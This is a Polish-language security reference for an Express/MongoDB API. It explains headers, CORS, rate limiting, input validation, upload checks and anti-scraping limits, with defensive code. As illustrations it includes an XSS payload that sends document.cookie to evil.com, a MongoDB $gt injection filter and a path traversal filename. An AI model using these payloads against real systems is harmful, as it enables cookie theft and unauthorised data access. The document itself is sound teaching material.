# Security — Notatki i wzorce z projektu ts_server_spo

Dokument opisuje wszystkie decyzje i mechanizmy bezpieczeństwa zastosowane w tym projekcie.
Służy jako materiał do nauki i odnośnik podczas code review.

---

## Spis treści

1. [HTTP Headers — Helmet](#1-http-headers--helmet)
2. [CORS — Cross-Origin Resource Sharing](#2-cors--cross-origin-resource-sharing)
3. [Rate Limiting — Ograniczenie liczby żądań](#3-rate-limiting--ograniczenie-liczby-żądań)
4. [HTTP Parameter Pollution (HPP)](#4-http-parameter-pollution-hpp)
5. [Walidacja danych wejściowych — Zod](#5-walidacja-danych-wejściowych--zod)
6. [Mass Assignment — pickAllowedFields](#6-mass-assignment--pickallowedfields)
7. [NoSQL Injection — MongoDB](#7-nosql-injection--mongodb)
8. [Bezpieczeństwo upload plików](#8-bezpieczeństwo-upload-plików)
9. [XSS w mailach — escapeHtml](#9-xss-w-mailach--escapehtml)
10. [Ukrywanie pól wrażliwych — Mongoose select: false](#10-ukrywanie-pól-wrażliwych--mongoose-select-false)
11. [Obsługa błędów — bez ujawniania szczegółów](#11-obsługa-błędów--bez-ujawniania-szczegółów)
12. [Trust Proxy — poprawne odczytywanie IP za reverse proxy](#12-trust-proxy--poprawne-odczytywanie-ip-za-reverse-proxy)
13. [Zmienne środowiskowe — walidacja przez Zod](#13-zmienne-środowiskowe--walidacja-przez-zod)
14. [Scraping danych wrażliwych — co i dlaczego naprawiono](#14-scraping-danych-wrażliwych--co-i-dlaczego-naprawiono)

---

## 1. HTTP Headers — Helmet

**Plik:** `src/app.ts`

Helmet to middleware, które ustawia/usuwa nagłówki HTTP chroniące przed typowymi atakami przeglądarkowym.

```ts
app.use(
  helmet({
    contentSecurityPolicy: false,       // wyłączone — to czyste API, brak dokumentów HTML
    crossOriginEmbedderPolicy: true,    // COEP: blokuje ładowanie zasobów cross-origin bez jawnej zgody
    crossOriginOpenerPolicy: true,      // COOP: izoluje kontekst przeglądarki
    crossOriginResourcePolicy: true,    // CORP: zapobiega ładowaniu odpowiedzi przez inne strony
    originAgentCluster: true,           // izolacja procesu na poziomie origin
    referrerPolicy: { policy: ['origin'] }, // wysyła tylko origin, nie pełny URL
    strictTransportSecurity: {
      maxAge: 63072000,                 // 2 lata — wymagane do preload listy HSTS
      includeSubDomains: true,
      preload: true,                    // pozwala na wpis do przeglądarek HSTS preload list
    },
    xContentTypeOptions: true,          // X-Content-Type-Options: nosniff — blokuje MIME sniffing
    xDnsPrefetchControl: { allow: false }, // wyłącza DNS prefetch
    xDownloadOptions: true,             // IE: otwieraj pliki w sandboxie, nie inline
    xFrameOptions: { action: 'deny' }, // blokuje iframing — ochrona przed Clickjacking
    xPermittedCrossDomainPolicies: { permittedPolicies: 'none' }, // blokuje Flash/Acrobat
    xPoweredBy: false,                  // usuwa nagłówek X-Powered-By (nie ujawniaj stack)
    xXssProtection: false,              // wyłączone celowo — stary mechanizm IE, może powodować XSS
  }),
);

app.disable('x-powered-by'); // dodatkowe zabezpieczenie — Express ustawia go niezależnie od helmet
```

### Czego się nauczyć

- **X-Powered-By** — nigdy nie ujawniaj frameworku/wersji serwera. Ułatwia to atakującemu dobór exploitów.
- **X-Frame-Options: DENY** — bez tego strona może być osadzona w `<iframe>` i użyta do Clickjacking (użytkownik myśli, że klika na swoją stronę, a klika na nakładkę).
- **HSTS** — wymusza HTTPS na poziomie przeglądarki. Raz odwiedzona strona z tym nagłówkiem nie może być zaatakowana przez SSL stripping przez 2 lata.
- **nosniff** — przeglądarka nie "zgaduje" MIME typu pliku. Bez tego plik `.txt` zawierający kod JS mógłby zostać wykonany.
- **X-XSS-Protection wyłączone** — paradoksalnie ten stary nagłówek (IE) może sam powodować XSS. Nowoczesne przeglądarki go ignorują.

---

## 2. CORS — Cross-Origin Resource Sharing

**Plik:** `src/app.ts`

```ts
function getAllowedCorsOrigins(): string[] {
  const envOrigins = process.env.CORS_ORIGINS;
  if (!envOrigins) {
    return ['https://spottedlezajsk.pl', 'https://www.spottedlezajsk.pl'];
  }

  const origins = envOrigins
    .split(',')
    .map((origin) => origin.trim())
    .filter(Boolean);

  return origins.length > 0
    ? origins
    : ['https://spottedlezajsk.pl', 'https://www.spottedlezajsk.pl'];
}

app.use(
  cors({
    origin: getAllowedCorsOrigins(),
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type'],
    credentials: false,
  }),
);
```

### Czego się nauczyć

- **CORS to ochrona przed nieautoryzowanym dostępem z innych domen w przeglądarce.** Nie chroni przed bezpośrednimi żądaniami (curl, Postman, skrypty serwerowe) — to tylko przeglądarka respektuje nagłówki CORS.
- Zawsze podawaj whitelist domen jawnie. Nigdy `origin: '*'` dla endpointów z danymi wrażliwymi.
- `credentials: false` — API nie używa ciasteczek/sesji, więc nie ma potrzeby ich dozwalać.
- `methods: ['GET', 'POST', 'OPTIONS']` — jawnie ograniczamy metody HTTP.
- Fallback na hardkodowane domeny jeśli `CORS_ORIGINS` jest puste — nie ma możliwości przypadkowego otwarcia CORS na wszystko.

---

## 3. Rate Limiting — Ograniczenie liczby żądań

**Plik:** `src/app.ts`, `src/constants.ts`

Trzy niezależne limitery, każdy dopasowany do wrażliwości endpointu:

```ts
// Upload wiadomości — najsurowszy: 8 żądań / 15 min
const uploadLimiter = rateLimit({
  max: RATE_LIMIT_MAX,          // 8
  windowMs: RATE_LIMIT_WINDOW_MS, // 15 min
  standardHeaders: true,        // wysyła RateLimit-* headers (RFC 6585)
  legacyHeaders: false,         // nie wysyła starych X-RateLimit-* headers
  handler: (_req, res) => {
    res.status(429).json({ error: 'Zbyt wiele żądań, spróbuj ponownie później.' });
  },
});

// Ogólne API — 120 żądań / 15 min
const apiLimiter = rateLimit({ max: 120, windowMs: 15 * 60 * 1000, ... });

// Dane kontaktowe — 20 żądań / 15 min (chroni przed scrapingiem PII)
const contactLimiter = rateLimit({ max: 20, windowMs: 15 * 60 * 1000, ... });

app.use('/api', apiLimiter);
app.use('/api/praca/:slug/contact', contactLimiter); // nakłada się — obowiązuje surowszy
app.use('/upload', uploadLimiter);
```

### Czego się nauczyć

- **Middleware w Express nakłada się** — `contactLimiter` jest stosowany dodatkowo na `/api/praca/:slug/contact`, mimo że `apiLimiter` już go dotyczy. Klient musi zmieścić się w obu limitach jednocześnie.
- Limiter działa **per IP**. Za reverse proxy (nginx, Cloudflare) trzeba skonfigurować `trust proxy`, inaczej wszystkie żądania będą miały IP `127.0.0.1` i jeden użytkownik wyczerpie limit dla wszystkich.
- `standardHeaders: true` — klient wie ile żądań mu zostało (pole `RateLimit-Remaining`), co jest przyjaznym UX.
- Różnicuj limity według wrażliwości: endpoint z danymi osobowymi powinien mieć znacznie surowszy limit niż lista publiczna.
- Rate limiting to **ostatnia linia obrony** przeciw scrapingowi — nie zastępuje autentykacji, ale podnosi koszt ataku.

---

## 4. HTTP Parameter Pollution (HPP)

**Plik:** `src/app.ts`

```ts
app.use(hpp());
```

### Czego się nauczyć

- W HTTP można wysłać ten sam parametr wielokrotnie: `?limit=25&limit=999999`.
- Express domyślnie parsuje to jako tablicę: `req.query.limit = ['25', '999999']`.
- HPP middleware zostawia **ostatnią** wartość jako string, co jest przewidywalne.
- Bez HPP walidacja `z.number()` na tablicy mogłaby się zachować nieoczekiwanie lub całkowicie ją pominąć.

---

## 5. Walidacja danych wejściowych — Zod

**Plik:** `src/validation/workSchemas.ts`

Każdy endpoint waliduje dane wejściowe przed jakimkolwiek dostępem do bazy.

```ts
// Slug: tylko małe litery, cyfry i myślniki, max 120 znaków
const slugSchema = z
  .string()
  .trim()
  .min(1)
  .max(120)
  .regex(/^[a-z0-9]+(?:-[a-z0-9]+)*$/);

// Cursor paginacji: dokładnie 24-znakowy hex (MongoDB ObjectId)
const objectIdRegex = /^[a-f\d]{24}$/i;
const idSchema = z.string().trim().regex(objectIdRegex);

// Lista ulubionych: tablica ObjectId, 1–100 elementów
export const favoritesBodySchema = z.object({
  ids: z.array(idSchema).min(1).max(100),
});

// Limit paginacji: liczba całkowita 1–25
export const workListQuerySchema = z.object({
  limit: z.preprocess((v) => (v === undefined ? 25 : Number(v)), z.number().int().min(1).max(25)).default(25),
  cursor: idSchema.optional(),
});
```

### Czego się nauczyć

- **Nigdy nie ufaj danym wejściowym** — każde pole z `req.params`, `req.query`, `req.body` to niezaufane dane zewnętrzne.
- Restrykcyjny regex na slug eliminuje: SQL injection, NoSQL injection, path traversal (`../`), null bytes.
- Walidacja ObjectId regexem zapobiega przekazaniu do Mongoose dowolnego stringa który mógłby zostać zinterpretowany jako operator (`$where`, `$gt`, itp.).
- `.safeParse()` zamiast `.parse()` — nie rzuca wyjątku, zwraca obiekt `{ success, data, error }`, co pozwala bezpiecznie zwrócić 400 bez try/catch.
- `z.preprocess()` — konwersja typu przed walidacją (query string `"25"` → number `25`).

---

## 6. Mass Assignment — pickAllowedFields

**Plik:** `src/utils/pickAllowedFields.ts`

```ts
export function pickAllowedFields<T extends readonly string[]>(
  input: unknown,
  allowedKeys: T,
): Partial<Record<T[number], unknown>> {
  if (!input || typeof input !== 'object' || Array.isArray(input)) return {};

  const source = input as Record<string, unknown>;
  const result: Partial<Record<T[number], unknown>> = {};

  for (const key of allowedKeys) {
    if (Object.hasOwn(source, key)) {
      result[key as T[number]] = source[key];
    }
  }

  return result;
}
```

Użycie w kontrolerach:

```ts
const WORK_LIST_QUERY_WHITELIST = ['limit', 'cursor'] as const;
const query = pickAllowedFields(req.query, WORK_LIST_QUERY_WHITELIST);
// Nieznane pola z req.query są tu odrzucone zanim trafią do Zod
```

### Czego się nauczyć

- **Mass assignment** (inaczej: "object injection") polega na tym, że klient wysyła więcej pól niż powinien, np. `{ "role": "admin", "name": "Jan" }` — bez whitelisty `role` trafi do bazy.
- `Object.hasOwn()` zamiast `key in obj` lub `obj.hasOwnProperty(key)` — odporne na prototype pollution (atak, gdzie ktoś ustawia właściwości na `Object.prototype`).
- Whitelist jako `as const` tuple + generyk TypeScript — TypeScript zna dokładnie które klucze są dozwolone, błędy wykrywane w czasie kompilacji.

---

## 7. NoSQL Injection — MongoDB

**Plik:** `src/db/mongo.ts`

```ts
mongoose.set('sanitizeFilter', true);
mongoose.set('strictQuery', true);
```

### Jak działa NoSQL injection

Bez walidacji ktoś może wysłać:
```json
{ "slug": { "$gt": "" } }
```
Mongoose bez `sanitizeFilter` przekazałoby to jako operator MongoDB — zapytanie zwróciłoby wszystkie dokumenty.

### Dlaczego to API jest bezpieczne

1. `sanitizeFilter: true` — Mongoose automatycznie usuwa operatory z filtrów.
2. Walidacja Zod z restrykcyjnym regexem na slug — zapis `$gt` nie przejdzie przez `^[a-z0-9]+(?:-[a-z0-9]+)*$`.
3. ObjectId tworzony przez `new Types.ObjectId(validatedId)` — zwalidowane wcześniej regexem `^[a-f\d]{24}$i`.
4. `strictQuery: true` — pola spoza schematu są ignorowane w zapytaniach.

---

## 8. Bezpieczeństwo upload plików

**Pliki:** `src/routes/upload.ts`, `src/controllers/uploadController.ts`, `src/utils/fileHelpers.ts`

Walidacja przebiega wielowarstwowo:

### Warstwa 1: MIME type z nagłówka HTTP (multer fileFilter)

```ts
fileFilter: (_req, file, cb) => {
  if (!ALLOWED_MIME_TYPES.includes(file.mimetype as ...)) {
    return cb(new Error('Nieprawidłowy typ pliku'));
  }
  cb(null, true);
},
```

**Problem z tą warstwą:** klient może wysłać dowolny MIME type w nagłówku — to wartość niezaufana.

### Warstwa 2: Weryfikacja magic bytes (sygnatura binarna pliku)

```ts
// src/utils/fileHelpers.ts
export async function detectMimeTypeFromSignature(filePath: string): Promise<string | null> {
  const handle = await fsp.open(filePath, 'r');
  const buffer = Buffer.alloc(12);
  await handle.read(buffer, 0, 12, 0);

  // JPEG: FF D8 FF
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return 'image/jpeg';

  // PNG: 89 50 4E 47 0D 0A 1A 0A
  if (buffer[0] === 0x89 && buffer[1] === 0x50 && ...) return 'image/png';

  return null;
}
```

**To jest kluczowa warstwa** — czyta pierwsze bajty rzeczywistej zawartości pliku. Nazwy pliku ani nagłówka HTTP nie można sfałszować tak, żeby ta weryfikacja przepuściła plik exe jako jpg.

### Warstwa 3: Limity rozmiaru

```ts
limits: {
  files: MAX_FILES,        // maks. 3 pliki
  fileSize: MAX_FILE_SIZE_BYTES, // 15 MB / plik
}
// + w kontrolerze:
if (totalFilesSize > MAX_TOTAL_FILES_SIZE_BYTES) { // 20 MB łącznie
```

### Warstwa 4: Sanityzacja nazwy pliku

```ts
export function safeFilename(originalName: string): string {
  return originalName.replace(/[^a-zA-Z0-9.\-_]/g, '_').slice(-120);
}
```

Bez tego `../../../etc/passwd` jako nazwa pliku mógłby prowadzić do **path traversal**.

### Warstwa 5: Sprzątanie plików tymczasowych

```ts
finally {
  await cleanupUploadedFiles(files); // zawsze, nawet przy błędzie
}
```

Pliki tymczasowe są zawsze usuwane — w bloku `finally`, więc nawet błąd wysyłki maila nie pozostawi ich na dysku.

### Czego się nauczyć

- **Nie ufaj rozszerzeniu pliku** — zmiana `wirus.exe` na `zdjecie.jpg` to sekunda pracy.
- **Nie ufaj Content-Type z nagłówka HTTP** — klient kontroluje ten nagłówek.
- **Magic bytes** to jedyna wiarygodna weryfikacja formatu pliku bez zewnętrznych bibliotek.
- Pliki tymczasowe to powierzchnia ataku — trzymaj je jak najkrócej i zawsze czyść w `finally`.
- Limit łącznego rozmiaru (nie tylko per plik) chroni przed atakiem 3×15MB=45MB.

---

## 9. XSS w mailach — escapeHtml

**Plik:** `src/utils/sendMail.ts`

```ts
function escapeHtml(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

html: `<h1>${escapeHtml(sender)}:</h1><p>${escapeHtml(message)}</p>`,
```

Bez escapowania ktoś mógłby wysłać jako treść wiadomości:
```
</p><img src=x onerror="fetch('https://evil.com?c='+document.cookie)"><p>
```
Klient pocztowy renderujący HTML wykonałby ten kod.

### Czego się nauczyć

- XSS (Cross-Site Scripting) to wstrzyknięcie kodu wykonywalnego w kontekście zaufanym przez ofiarę.
- Każde miejsce, gdzie dane od użytkownika trafiają do kontekstu HTML (strona, mail, PDF), wymaga escapowania.
- Minimalne escapowanie HTML: `&`, `<`, `>`, `"`, `'`. Pominięcie nawet jednego znaku może wystarczyć do ataku.
- Załączniki: `safeFilename(file.originalname)` w nagłówku maila zapobiega **header injection** przez specjalne znaki w nazwie pliku (np. `\r\n` w nagłówku `Content-Disposition`).

---

## 10. Ukrywanie pól wrażliwych — Mongoose `select: false`

**Plik:** `src/models/workModel.ts`

```ts
const workSchema = new Schema({
  slug:        { type: String, required: true, unique: true },
  title:       { type: String, required: true },
  description: { type: String, required: true },
  tags:        { type: [String], default: [] },
  contact:     { type: contactSchema, select: false }, // e-mail, telefon, adres — ukryte domyślnie
  author:      { type: String, required: true, select: false }, // imię/nick dodającego — ukryte domyślnie
  createdAt:   { type: Date, default: Date.now },
});
```

`select: false` oznacza, że pole **nigdy nie jest zwracane** chyba że jawnie zażądano `.select('+contact')`.

### Użycie w kontrolerze

```ts
// Lista i pojedyncze ogłoszenie — publicProjection jawnie wyklucza author
const publicProjection = { author: 0 } as const;

// Endpoint kontaktu — jawnie włącza ukryte pole contact
const workContact = await WorkModel.findOne({ slug })
  .select({ contact: 1 })
  .select('+contact')
  .lean()
  .exec();
```

### Czego się nauczyć

- `select: false` to **domyślne ukrycie** — jeśli zapomnisz dodać projekcję w zapytaniu, pole i tak nie wróci. Bezpieczne domyślnie.
- `{ author: 0 }` w zapytaniu to jawne wykluczenie — zadziała tylko jeśli o nim pamiętasz.
- Połączenie obu technik jest bezpieczniejsze: `select: false` jako siatka bezpieczeństwa + projekcja dla jasności kodu.
- `.lean()` — zwraca czysty obiekt JS zamiast dokumentu Mongoose. Szybsze i nie doda nieoczekiwanych metod/pól do odpowiedzi.

---

## 11. Obsługa błędów — bez ujawniania szczegółów

**Plik:** `src/middleware/errorHandler.ts`

```ts
export function errorHandler(error: Error, _req: Request, res: Response, _next: NextFunction): void {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      res.status(400).json({ error: 'Pojedynczy plik nie może być większy niż 15 MB.' });
      return;
    }
    res.status(400).json({ error: 'Nieprawidłowe dane pliku.' });
    return;
  }

  if (error.message === 'Nieprawidłowy typ pliku') {
    res.status(400).json({ error: 'Nieprawidłowy typ pliku. Akceptowane typy to: .jpeg, .png, .jpg' });
    return;
  }

  // Catch-all — żadnych szczegółów błędu na zewnątrz
  res.status(500).json({ error: 'Wystąpił błąd serwera.' });
}
```

### Czego się nauczyć

- **Nigdy nie zwracaj stack trace ani wewnętrznej treści błędu** do klienta — daje atakującemu mapę kodu, ścieżki plików, wersje bibliotek.
- Catch-all `500` bez szczegółów: błąd logowany po stronie serwera, klient dostaje tylko generyczny komunikat.
- Błędy domenowe (multer, walidacja) obsługuj osobno z czytelnymi komunikatami dla UX.
- Express 5 automatycznie przekazuje odrzucone Promise z async kontrolerów do error handlera — nie trzeba owijać każdego `await` w try/catch.

---

## 12. Trust Proxy — poprawne odczytywanie IP za reverse proxy

**Plik:** `src/app.ts`

```ts
function resolveTrustProxyValue(): boolean | number {
  const value = process.env.TRUST_PROXY;

  if (!value) {
    return process.env.NODE_ENV === 'production' ? 1 : false;
  }

  if (value === 'true') return true;
  if (value === 'false') return false;

  const numericValue = Number(value);
  return Number.isNaN(numericValue) ? false : numericValue;
}

app.set('trust proxy', resolveTrustProxyValue());
```

### Czego się nauczyć

- Za nginx/Cloudflare serwer widzi IP `127.0.0.1` lub IP load balancera, nie klienta. Prawdziwe IP jest w nagłówku `X-Forwarded-For`.
- `trust proxy: 1` — ufaj pierwszemu proxy w łańcuchu (bezpośredni reverse proxy). Express wtedy używa `X-Forwarded-For` do rate limitingu.
- **Niebezpieczne ustawienie:** `trust proxy: true` (ufaj wszystkim) — klient może sam ustawić `X-Forwarded-For: 1.2.3.4` i ominąć rate limiter, bo każde żądanie będzie miało inne "IP".
- W środowisku dev `trust proxy: false` — nie ma proxy, więc `req.ip` jest poprawne bezpośrednio.

---

## 13. Zmienne środowiskowe — walidacja przez Zod

**Plik:** `src/db/mongo.ts`

```ts
const mongoEnvSchema = z.object({
  MONGODB_DB_NAME: z.string().trim().min(1),
  MONGODB_USER:    z.string().trim().min(1),
  MONGODB_PASSWORD: z.string().trim().min(1),
  MONGODB_HOST:    z.string().trim().default('mongo56.mydevil.net'),
  MONGODB_PORT:    z.preprocess(..., z.number().int().min(1).max(65535)).default(27017),
  MONGODB_PROTOCOL: z.enum(['mongodb', 'mongodb+srv']).default('mongodb'),
});

const parsedEnv = mongoEnvSchema.safeParse(process.env);
if (!parsedEnv.success) {
  throw new Error(`Nieprawidlowa konfiguracja MongoDB: ${parsedEnv.error.issues[0]?.message}`);
}
```

Dane logowania są enkodowane przed wstawieniem do URI:

```ts
function encodeCredential(value: string): string {
  try {
    return encodeURIComponent(decodeURIComponent(value));
  } catch {
    return encodeURIComponent(value);
  }
}

const uri = `${protocol}://${encodeCredential(user)}:${encodeCredential(pass)}@${host}:${port}/${db}`;
```

### Czego się nauczyć

- Waliduj zmienne env przy starcie — aplikacja nie powinna uruchamiać się z niepełną konfiguracją. Błąd wyraźny przy starcie jest lepszy niż tajemniczy crash w runtime.
- `encodeURIComponent` na hasłach do URI — hasło zawierające `@`, `:`, `/` złamałoby parsowanie URI bez enkodowania.
- Podwójny `decode → encode` — obsługuje zarówno hasła zakodowane jak i niekodowane bez duplikacji kodowania (`%40` nie staje się `%2540`).

---

## 14. Scraping danych wrażliwych — co i dlaczego naprawiono

### Problem

Endpoint `GET /api/praca/:slug/contact` zwraca dane kontaktowe (e-mail, telefon, adres).

Bez dodatkowej ochrony atakujący mógłby:
1. Pobrać wszystkie slugi z `GET /api/praca` (publiczny, paginowany endpoint).
2. Dla każdego sluga wywołać `GET /api/praca/{slug}/contact`.
3. Przy ogólnym limicie 120 req/15 min — w 15 minut zebrać dane kontaktowe ~115 ogłoszeń.

### Rozwiązanie

Dedykowany, surowszy limiter nakładający się na ogólny:

```ts
// constants.ts
export const CONTACT_RATE_LIMIT_MAX = 20;
export const CONTACT_RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000;

// app.ts
app.use('/api', apiLimiter);                           // 120 req / 15 min
app.use('/api/praca/:slug/contact', contactLimiter);  // + 20 req / 15 min
```

Klient musi zmieścić się w **obu** limitach jednocześnie. Przy 20 żądaniach do `/contact` co 15 min zebranie 100 kontaktów zajęłoby ponad godzinę.

### Czego się nauczyć

- CORS nie chroni przed scrapingiem — to ochrona przeglądarki. Curl i Python requests ignorują nagłówki CORS.
- Kliknięcie przycisku "Pokaż kontakt" na frontendzie to konwencja UX — backend musi samodzielnie egzekwować ograniczenia.
- Różnicuj limity według wrażliwości danych: lista publiczna >> dane osobowe.
- Nakładanie wielu limiterów (ogólny + specyficzny) jest poprawne w Express — żądanie musi przejść przez wszystkie.
- Kompletna ochrona przed scrapingiem wymagałaby autentykacji (np. token po rejestracji). Rate limiting to bariera kosztowna, nie nieprzebyta.
